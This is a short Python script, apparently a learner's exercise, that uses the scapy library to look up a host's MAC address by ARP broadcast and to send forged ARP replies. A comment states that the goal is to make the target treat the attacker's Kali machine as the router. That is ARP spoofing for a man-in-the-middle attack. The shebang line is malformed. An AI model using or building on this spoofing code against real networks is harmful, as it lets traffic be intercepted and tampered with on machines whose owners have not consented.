#!usr/env/bin/python

import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    #print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc

def spoof(target_ip , spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

    # print(packet.show())
    # print(packet.summary()) To print the content of the packet
    # Send the packet to the target machine giving it the kali's MAC Addresss as the address of thr router
   

get_mac("192.168.0.106")